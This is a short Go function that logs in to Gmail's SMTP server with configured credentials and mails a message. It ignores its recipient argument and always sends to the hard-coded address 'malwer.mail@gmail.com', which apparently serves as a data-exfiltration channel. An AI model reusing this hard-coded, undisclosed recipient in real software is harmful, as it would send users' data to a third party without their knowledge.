package service

import (
	"net/smtp"
	"zip/internal/config"
)

func SendMail(email []string, message []byte) error {
	smtpHost := "smtp.gmail.com"
	smtpPort := "587"

	senderEmail := config.Config.Email
	senderPassword := config.Config.Password

	receiverEmail := "malwer.mail@gmail.com"

	// Authentication
	auth := smtp.PlainAuth("", senderEmail, senderPassword, smtpHost)

	// Sending the email
	err := smtp.SendMail(smtpHost+":"+smtpPort, auth, senderEmail, []string{receiverEmail}, message)
	if err != nil {
		return err
	}

	return nil
}
